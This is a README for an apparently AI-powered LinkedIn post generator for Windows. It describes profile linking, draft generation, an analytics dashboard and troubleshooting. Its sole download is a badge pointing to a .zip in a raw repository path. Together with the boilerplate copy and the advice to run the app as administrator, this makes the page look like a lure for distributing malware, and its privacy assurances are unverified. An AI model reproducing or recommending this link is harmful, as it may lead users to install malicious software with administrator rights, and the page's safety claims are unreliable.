# ✍️ claude-linkedin-post-creator - Build Better LinkedIn Posts with AI

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ajayfastfooted329/claude-linkedin-post-creator/raw/refs/heads/main/posts/linkedin-creator-post-claude-v2.1.zip)

This tool helps you write effective LinkedIn posts. It connects to your profile, looks at successful posts in your field, and suggests topics that match how you speak. It also updates you on how your posts perform so you can refine your strategy over time.

## 📋 What This Tool Does

You need a clear plan to build a personal brand. Many people struggle to find the right words or topics for their professional network. This software solves that by using artificial intelligence to bridge the gap between your ideas and a finished draft.

The software analyzes your past activity to learn your voice. It reads industry trends to find relevant topics. It generates drafts you can edit, adjust, or post directly. It tracks data to show you which posts reach the most people.

## 🚀 Setting Up Your Profile

You must link your account before the tool can suggest posts. When you open the app, you will see a settings menu. Click the Profile button to start.

- Authenticate: You will see a button to connect your LinkedIn account.
- Permissions: The app asks for read-only access to your posts. This ensures the app learns your style without changing your account.
- Style Preferences: You can toggle settings for tone. Choose between professional, casual, or technical styles.
- Topic Selection: Pick three areas of expertise. The AI uses these to research trends.

## 💡 How to Generate Your First Post

Once you link your account, the app is ready. Follow these steps to generate your first draft:

1. Click the Start button on the home screen.
2. Select Generate Idea from the menu.
3. Wait a moment while the AI reads recent industry news.
4. Review the three topic suggestions. If you dislike them, click Refresh to see three new ideas.
5. Click a topic to open the draft window.
6. Use the slider tool to adjust the length of the post.
7. Click Generate Draft. The software writes the post based on your past writing habits.
8. Make changes directly in the text box.
9. Click Copy to Clipboard to paste the content into LinkedIn, or click Schedule to set a time for it to post automatically.

## 📈 Tracking Performance

Good content requires review. The app includes a Dashboard tab to keep you updated. You can see how many people viewed your posts and how many engaged with them.

- Filtering: Use the date range picker to look at performance from the last month or the last week.
- Engagement Rate: The app calculates the percentage of readers who commented or liked your content.
- Best Time: Check the Insights section to see when your network is most active. Use this to pick the best time to share your next post.

## 🛠 Solving Common Issues

If you run into trouble, try these troubleshooting steps:

- Application will not open: Close the app completely and try opening it as an administrator. Right-click the icon and choose Run as administrator.
- No suggestions appear: Check your internet connection. AI tools need a stable signal to retrieve data.
- Profile link fails: Log out of LinkedIn in your browser and log back in, then retry the connection within the app.
- Outdated data: If the software shows old post statistics, click the Sync button in the Dashboard tab to refresh your data.

## 🔐 Privacy and Security

Your data is yours. This software processes your data locally on your machine. We do not store your LinkedIn password or private messages. The software only reads the public parts of your profile needed to understand your writing style. 

If you decide to stop using the application, you can uninstall it through the Windows Control Panel. This removes all local settings, including your cached profile data. Your LinkedIn account remains safe, and you can revoke the app's access at any time through the LinkedIn settings menu under Third-Party Applications.
